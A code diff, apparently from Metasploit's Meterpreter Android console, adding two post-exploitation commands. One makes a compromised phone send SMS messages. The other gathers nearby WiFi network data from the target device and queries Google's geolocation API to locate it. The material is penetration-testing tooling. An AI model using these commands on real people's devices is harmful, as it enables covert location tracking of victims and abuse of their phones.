@@ -26,7 +26,9 @@ class Console::CommandDispatcher::Android
       'geolocate'         => 'Get current lat-long using geolocation',
       'dump_calllog'      => 'Get call log',
       'check_root'        => 'Check if device is rooted',
-      'device_shutdown'   => 'Shutdown device'
+      'device_shutdown'   => 'Shutdown device',
+      'send_sms'	  => 'Sends SMS from target session',
+      'wlan_geolocate'    => 'Get current lat-long using WLAN information',
     }
 
     reqs = {
@@ -35,7 +37,9 @@ class Console::CommandDispatcher::Android
       'geolocate'       => [ 'geolocate' ],
       'dump_calllog'    => [ 'dump_calllog' ],
       'check_root'      => [ 'check_root' ],
-      'device_shutdown' => [ 'device_shutdown']
+      'device_shutdown' => [ 'device_shutdown'],
+      'send_sms'	=> [ 'send_sms' ],
+      'wlan_geolocate'	=> [ 'wlan_geolocate' ]
     }
 
     # Ensure any requirements of the command are met
@@ -343,6 +347,7 @@ class Console::CommandDispatcher::Android
   end
 
 
+
   def cmd_check_root(*args)
 
     check_root_opts = Rex::Parser::Arguments.new(
@@ -367,6 +372,106 @@ class Console::CommandDispatcher::Android
       print_status('Device is not rooted')
     end
   end
+
+  def cmd_send_sms(*args)
+    send_sms_opts = Rex::Parser::Arguments.new(
+      '-h' => [ false, 'Help Banner' ],
+      '-d' => [ true, 'Destination number' ],
+      '-t' => [ true, 'SMS body text' ]
+    )
+    dest=''
+    body=''
+    send_sms_opts.parse(args) { | opt, idx, val |
+      case opt
+      when '-h'
+        print_line('Usage: send_sms -d <number> -t <sms body>')
+        print_line('Sends SMS messages to specified number.')
+        print_line(send_sms_opts.usage)
+        return
+      when '-d'
+	dest=val
+      when '-t'
+	body=val
+      end
+    }
+    if (dest.blank? or body.blank?)
+        print_error("You must enter both a destination address -d and the SMS text body -t")
+	print_error('e.g. send_sms -d +351961234567 -t "GREETINGS PROFESSOR FALKEN."')
+        print_line(send_sms_opts.usage)
+	return
+    end
+    sent=client.android.send_sms(dest,body)
+    if (sent)
+        print_good('SMS sent')
+    else
+        print_status('SMS failed to send')
+    end
+  end
+
+  def cmd_wlan_geolocate(*args)
+
+    wlan_geolocate_opts = Rex::Parser::Arguments.new(
+      '-h' => [ false, 'Help Banner' ]
+    )
+
+    wlan_geolocate_opts.parse(args) { | opt, idx, val |
+      case opt
+      when '-h'
+        print_line('Usage: wlan_geolocate')
+        print_line('Tries to get device geolocation from WLAN information and Google\'s API')
+        print_line(wlan_geolocate_opts.usage)
+        return
+      end
+    }
+
+    log = client.android.wlan_geolocate
+    wlan_list=''
+    log.each{|x|
+	mac=x['bssid']
+	ssid=x['ssid']
+	ss=x['level']
+	network_data = "&wifi=mac:#{mac}|ssid:#{ssid}|ss=#{ss}"
+	wlan_list << network_data
+#	print_status(x['ssid']+" ("+x['bssid']+") pwr: "+x['level'].to_s())
+    }
+
+    if wlan_list.blank?
+      print_error("Unable to enumerate wireless networks from the target.  Wireless may not be present or enabled.")
+      return
+    end
+
+    # Build and send the request to Google
+    url = "https://maps.googleapis.com/maps/api/browserlocation/json?browser=firefox&sensor=true#{wlan_list}"
+    uri = URI.parse(URI.encode(url))
+    request = Net::HTTP::Get.new(uri.request_uri)
+    http = Net::HTTP::new(uri.host,uri.port)
+    http.use_ssl = true
+    response = http.request(request)
+
+    # Gather the required information from the response
+    if response && response.code == '200'
+      results = JSON.parse(response.body)
+      latitude =  results["location"]["lat"]
+      longitude = results["location"]["lng"]
+      accuracy = results["accuracy"]
+      print_status("Google indicates that the target is within #{accuracy} meters of #{latitude},#{longitude}.")
+      print_status("Google Maps URL:  https://maps.google.com/?q=#{latitude},#{longitude}")
+    else
+      print_error("Failure connecting to Google for location lookup.")
+    end
+
+#    print_status(log)
+#    log.each{|x|
+#	print_line(x)
+#    }
+    #if is_rooted
+    #  print_good('Device is rooted')
+    #elsif
+    #  print_status('Device is not rooted')
+    #end
+  end
+
+
 
   #
   # Name for this dispatcher
